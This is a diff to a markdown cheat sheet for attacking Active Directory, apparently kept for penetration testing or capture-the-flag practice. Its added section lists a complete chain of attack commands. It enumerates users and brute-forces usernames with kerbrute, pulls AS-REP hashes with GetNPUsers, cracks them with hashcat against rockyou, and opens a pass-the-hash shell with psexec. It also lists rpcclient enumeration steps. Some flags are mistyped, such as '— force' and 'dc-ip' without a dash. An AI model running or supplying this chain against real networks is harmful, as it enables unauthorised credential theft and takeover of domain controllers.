@@ -4,6 +4,24 @@
 ### Get Domain name
 - `smbmap -H $IP`
 
+### Get user's list
+- `GetADUsers.py $DOMAIN.local/ -dc-ip $IP -debug`
+
+### Brute-force users on Domain
+- `kerbrute userenum -d $DOMAIN.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt — dc $IP`
+
+### Enumerate shares
+- `smbclient -L \\\\$IP -N`
+
+### Get Hashes
+- `GetNPUsers.py '$DOMAIN' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip $IP`
+
+### Crack Hashes
+- `hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt — force`
+
+### Shell
+`psexec.py -hashes '$HASH' dc-ip $IP $User@$IP`
+
 ### rpcclient
 - `rpcclient -U "" -N $DOMAIN` Connect to rpcclient
 - `enumdomusers` Enumerate Domain Users
@@ -14,14 +32,6 @@
 
 <!-- -->
 [Enumerating AD with rpcclient](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)
-
-### AS-REP roasting
-AS-REP roasting is only applicable when set `Accounts Does not Require Pre-Authentication`
-
- EXPLOITING:
-- put all user's in a file names `users.txt`
-- `GetNPUsers.py $DOMAIN -dc-ip $IP -usersfile users.txt`
-GetNPUsers is in impacket
 
 ### BloodHound
 starting BloodHound
